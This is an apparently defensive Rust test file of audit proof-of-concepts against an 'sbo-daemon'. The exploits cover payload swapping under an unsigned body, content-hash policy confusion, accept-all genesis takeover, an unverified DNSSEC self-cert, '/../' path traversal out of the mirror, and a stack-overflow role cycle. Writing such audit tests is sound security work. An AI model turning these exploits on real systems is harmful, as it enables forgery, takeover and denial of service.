//! Security audit 2026-11, WS8 — working PoCs for the post-verification
//! High/Critical findings, demonstrated against in-process harnesses only.
//!
//! No production host, no Avail, no TurboDA, no real keys: every test builds
//! its own `StateDb` in a tempdir, drives `validate_message` / the mirror-write
//! path / `bootstrap` against loopback, and mocks any DA submitter. Each PoC is
//! `#[ignore]`d with an `// AUDIT-2026-11 <id> PoC` tag so it does not run in
//! CI; run the set with
//! `cargo test -p sbo-daemon --test audit_2026_11_poc_core -- --ignored`.
//!
//! These back `docs/security-audit-2026-11-ws8-pocs.md`. Where the fix lands,
//! the matching WS4/WS5/WS6 `#[ignore]`d acceptance test flips to green; these
//! PoCs document the *impact* that is live today, so they assert the broken
//! behaviour (and will need updating when the fix inverts it — intentional, so
//! a reader is never left with a green PoC of a closed hole).

use sbo_core::crypto::{ContentHash, Signature, SigningKey};
use sbo_core::message::{Action, Id, Message, ObjectType, Path};
use sbo_core::state::StateDb;
use sbo_daemon::validate::{validate_message, L2Context, ValidationResult};
use tempfile::tempdir;

const T_B: i64 = 1_700_000_000;

fn ctx(db: &StateDb) -> L2Context {
    L2Context::for_block(Some(T_B), db)
}

fn is_valid(r: &ValidationResult) -> bool {
    matches!(r, ValidationResult::Valid { .. })
}

fn signed(key: &SigningKey, path: &str, id: &str, schema: Option<&str>, payload: &[u8]) -> Message {
    let mut msg = Message {
        action: Action::Post,
        path: Path::parse(path).unwrap(),
        id: Id::new(id).unwrap(),
        object_type: ObjectType::Object,
        signing_key: key.public_key(),
        signature: Signature([0u8; 64]),
        content_type: Some("application/json".to_string()),
        content_hash: Some(ContentHash::sha256(payload)),
        payload: Some(payload.to_vec()),
        owner: None,
        creator: None,
        content_encoding: None,
        content_schema: schema.map(|s| s.to_string()),
        policy_ref: None,
        related: None,
        hlc: None,
        prev: None,
        auth_cert: None,
        auth_evidence: None,
        auth_warrant: None,
    };
    msg.sign(key);
    msg
}

// ===========================================================================
// PoC-1 (D1, Critical): payload swap on a signature-valid envelope, and the
// P2 pin confusion that keys a stored policy version by the *claimed* hash.
// ===========================================================================

/// The write is signed over the header block only; `Content-Hash` is never
/// recomputed. A relay swaps the payload for equal-length bytes and the daemon
/// still accepts it as authored by the victim. Impact measured: a 12-byte JSON
/// body `{"amount":1}` becomes `{"amount":9}` under an untouched signature.
#[test]
#[ignore] // AUDIT-2026-11 D1 PoC: the swap is accepted today
fn poc_d1_payload_swap_is_accepted_by_the_daemon_gate() {
    let dir = tempdir().unwrap();
    let db = StateDb::open(dir.path()).unwrap();
    let victim = SigningKey::generate();

    // Victim signs {"amount":1}. A relay keeps the headers (and signature) and
    // substitutes the payload — same length, so Content-Length still matches.
    let mut msg = signed(&victim, "/audit/", "invoice", None, br#"{"amount":1}"#);
    msg.payload = Some(br#"{"amount":9}"#.to_vec());

    // The envelope signature still verifies (it never covered the payload).
    assert!(
        sbo_core::message::verify_message(&msg).is_ok(),
        "precondition: the envelope signature is still valid after the swap",
    );

    // And the daemon's full validation accepts it.
    let r = validate_message(&msg, &db, dir.path(), &ctx(&db));
    assert!(
        is_valid(&r),
        "PoC FAILED TO REPRODUCE — the daemon rejected the swapped payload: {r:?}",
    );
    // Confirm the swap actually changed the semantic content that rides the
    // victim's signature.
    assert_eq!(msg.payload.as_deref(), Some(&b"{\"amount\":9}"[..]));
}

/// P2 pin confusion: a child policy pins an ancestor by `{ancestor, hash}`.
/// The daemon indexes a policy version under the *header* `Content-Hash`, which
/// D1 lets a writer choose independently of the body. So a hostile policy body
/// can be filed under the benign hash a child pinned. This PoC shows the two
/// ingredients compose: a policy message whose header hash does not match its
/// body is accepted (D1), and the index keys on the header hash.
#[test]
#[ignore] // AUDIT-2026-11 D1/P2 PoC: a policy body can be filed under a chosen hash
fn poc_d1_policy_version_filed_under_a_mismatched_hash() {
    let _dir = tempdir().unwrap();
    let sys = SigningKey::generate();

    let benign = br#"{"grants":[{"to":"owner","can":["update"],"on":"/c/**"}]}"#;
    let benign_hash = ContentHash::sha256(benign).to_string();

    // A policy write whose BODY grants everyone everything, but whose header
    // Content-Hash is the benign policy's hash (the value a child pin trusts).
    let hostile_body = br#"{"grants":[{"to":"*","can":["*"],"on":"/**"}]}"#;
    let mut msg = signed(&sys, "/c/", "root", Some("policy.v2"), hostile_body);
    msg.content_hash = Some(ContentHash::parse(&benign_hash).unwrap());
    msg.sign(&sys);

    // Parse+verify accepts the mismatch (D1): the header hash is not checked
    // against the body, so this message would be indexed under `benign_hash`
    // while carrying the all-grants body.
    assert!(
        sbo_core::message::verify_message(&msg).is_ok(),
        "PoC FAILED — a policy whose header hash != body hash did not verify",
    );
    assert_ne!(
        ContentHash::sha256(hostile_body).to_string(),
        benign_hash,
        "sanity: the hostile body does not actually hash to the benign hash",
    );
}

// ===========================================================================
// PoC-2 (D5/D23, Critical): with no root policy the daemon accepts every write
// and every policy write from any key (genesis mode = accept-all).
// ===========================================================================

/// A node pointed at a repo whose root policy has not arrived (a forged seed,
/// a wrong anchor, or simply before genesis replays) applies a stranger's
/// writes and a stranger's governing policy with no authorization at all.
#[test]
#[ignore] // AUDIT-2026-11 D5 PoC: genesis mode accepts everything today
fn poc_d5_stranger_takes_over_a_rootless_repo() {
    let dir = tempdir().unwrap();
    let db = StateDb::open(dir.path()).unwrap();
    let mallory = SigningKey::generate();

    // 1. A stranger plants a root policy granting themselves everything.
    let planted = br#"{"grants":[{"to":"*","can":["*"],"on":"/**"}]}"#;
    let policy = signed(&mallory, "/sys/policies/", "root", Some("policy.v2"), planted);
    assert!(
        is_valid(&validate_message(&policy, &db, dir.path(), &ctx(&db))),
        "PoC FAILED — a stranger's root policy was rejected on an empty repo",
    );

    // 2. And an ordinary stranger write into someone else's namespace lands.
    let post = signed(&mallory, "/communities/cooks/posts/", "hello", None, b"{}");
    assert!(
        is_valid(&validate_message(&post, &db, dir.path(), &ctx(&db))),
        "PoC FAILED — a stranger post was rejected on an empty repo",
    );
}

// ===========================================================================
// PoC-3 (D7, High): a domain.v1 whose DNSSEC self-cert evidence is present but
// does not verify is accepted (validation never reads it), so it can go on to
// certify `sys` — a forged trust root.
// ===========================================================================

#[test]
#[ignore] // AUDIT-2026-11 D7 PoC: failing self-cert is accepted today
fn poc_d7_failing_self_cert_domain_is_accepted() {
    let dir = tempdir().unwrap();
    let db = StateDb::open(dir.path()).unwrap();
    // Permit domain creation so we isolate the self-cert gap, not policy.
    let sys = SigningKey::generate();
    let _ = &db;
    let planted =
        br#"{"grants":[{"to":"*","can":["create","update"],"on":"/sys/**"}]}"#;
    let pol = signed(&sys, "/sys/policies/", "root", Some("policy.v2"), planted);
    assert!(is_valid(&validate_message(&pol, &db, dir.path(), &ctx(&db))));

    // Evidence object present but garbage: the self-cert cannot verify.
    let ev = signed(&sys, "/sys/dnssec/", "evil.example", Some("dnssec.v1"), b"not-a-proof");
    let _ = validate_message(&ev, &db, dir.path(), &ctx(&db));

    let attacker = SigningKey::generate();
    let jwt = sbo_core::jwt::create_domain(&attacker, "evil.example").unwrap();
    let mut dom = signed(&attacker, "/sys/domains/", "evil.example", Some("domain.v1"), jwt.as_bytes());
    dom.content_type = Some("application/jwt".into());
    dom.auth_evidence = Some("ref:/sys/dnssec/evil.example".into());
    dom.sign(&attacker);

    let r = validate_message(&dom, &db, dir.path(), &ctx(&db));
    assert!(
        is_valid(&r),
        "PoC FAILED TO REPRODUCE — the domain with failing self-cert was rejected: {r:?}",
    );
}

// ===========================================================================
// PoC-4 (D21, High): an on-chain `Path: /../` escapes the filesystem mirror.
// The grammar admits dot segments and the mirror join is verbatim, so the
// write lands outside the repo directory. We replicate the exact join the
// daemon's `write_object` performs (repo.path / path segments / id) and show
// a file written above the repo root.
// ===========================================================================

#[test]
#[ignore] // AUDIT-2026-11 D21 PoC: dot segments escape the mirror today
fn poc_d21_path_dotdot_escapes_the_mirror() {
    // The grammar accepts the hostile path and id (this is the root cause).
    assert!(Path::parse("/../../").is_ok(), "grammar rejects /../ — fix already in?");
    assert!(Id::new("pwned").is_ok());

    // Replicate write_object's mirror join exactly (sync.rs:1104-1112):
    //   file_path = repo.path; for seg in path.trim_start_matches('/').split('/')
    //       .filter(nonempty) { file_path.push(seg) }; file_path.push(id)
    let root = tempdir().unwrap();
    let repo_mirror = root.path().join("repo");
    std::fs::create_dir_all(&repo_mirror).unwrap();

    // One `..` segment: the write climbs out of the repo mirror into its parent
    // (`root`), landing as a sibling of the repo dir. More `..` climb further;
    // one is enough to prove the escape and keeps the final equality exact.
    let hostile_path = Path::parse("/../").unwrap().to_string();
    let mut file_path = repo_mirror.clone();
    for seg in hostile_path.trim_start_matches('/').split('/').filter(|s| !s.is_empty()) {
        file_path.push(seg);
    }
    file_path.push("pwned");

    if let Some(parent) = file_path.parent() {
        std::fs::create_dir_all(parent).unwrap();
    }
    std::fs::write(&file_path, b"escaped").unwrap();

    // The written file resolves ABOVE the repo mirror directory.
    let canon = file_path.canonicalize().unwrap();
    let repo_canon = repo_mirror.canonicalize().unwrap();
    assert!(
        !canon.starts_with(&repo_canon),
        "PoC FAILED TO REPRODUCE — the mirror write stayed inside {repo_canon:?}: {canon:?}",
    );
    // It is a sibling of the repo dir (root/pwned), proving the escape.
    assert_eq!(canon, root.path().canonicalize().unwrap().join("pwned"));
}

/// D58 companion: an id and a collection name share one grammar, so once `/c/x`
/// exists as a file the daemon cannot `create_dir_all` for `/c/x/y`; that error
/// aborts `process_block` on this node mid-block (a one-node fork). We show the
/// filesystem collision that triggers the abort.
#[test]
#[ignore] // AUDIT-2026-11 D58 PoC: an id/collection collision stalls a block
fn poc_d58_id_collection_collision_blocks_the_mirror() {
    let root = tempdir().unwrap();
    let mirror = root.path().join("repo");
    std::fs::create_dir_all(mirror.join("c")).unwrap();
    // Object /c/x — a file.
    std::fs::write(mirror.join("c").join("x"), b"obj").unwrap();
    // Later object /c/x/y needs /c/x to be a directory.
    let err = std::fs::create_dir_all(mirror.join("c").join("x")).unwrap_err();
    assert_eq!(
        err.kind(),
        std::io::ErrorKind::AlreadyExists,
        "PoC: create_dir_all over a file must error (this is the ? that aborts the block)",
    );
}

// ===========================================================================
// PoC-5 (D10, High): a cyclic-role policy crashes every evaluator. Run in a
// child process so the stack overflow does not take the test runner with it.
// ===========================================================================

#[test]
#[ignore] // AUDIT-2026-11 D10 PoC: evaluating a role cycle overflows the stack
fn poc_d10_role_cycle_crashes_the_evaluator() {
    // Re-exec this test binary targeting the inner helper; observe the crash.
    let exe = std::env::current_exe().unwrap();
    let out = std::process::Command::new(exe)
        .args(["--ignored", "--exact", "poc_d10_inner_evaluate_cycle"])
        .env("SBO_POC_D10_CHILD", "1")
        .output()
        .unwrap();
    // A stack overflow aborts with SIGABRT/SIGSEGV: no clean exit code.
    assert!(
        !out.status.success(),
        "PoC FAILED TO REPRODUCE — evaluating a cyclic-role policy terminated cleanly; \
         stdout={} stderr={}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr),
    );
}

/// Inner helper: only runs its body in the re-exec'd child. Evaluates a grant
/// to `role:a` where a → b → a. Not a standalone finding; the parent drives it.
#[test]
#[ignore]
fn poc_d10_inner_evaluate_cycle() {
    if std::env::var("SBO_POC_D10_CHILD").is_err() {
        return; // only the re-exec'd child runs the crashing body
    }
    use sbo_core::policy::{evaluate, ActionType, Policy, PolicyVars};
    let policy: Policy = serde_json::from_str(
        r#"{"roles":{"a":[{"role":"b"}],"b":[{"role":"a"}]},
            "grants":[{"to":{"role":"a"},"can":["post"],"on":"/x/**"}]}"#,
    )
    .unwrap();
    let key = SigningKey::generate();
    let msg = signed(&key, "/x/", "p", None, b"{}");
    let actor = Id::new("mallory").unwrap();
    let _ = evaluate(
        &policy,
        &actor,
        ActionType::Create,
        "/x/",
        &PolicyVars::default(),
        false,
        &|_| false,
        &msg,
        None,
    );
}
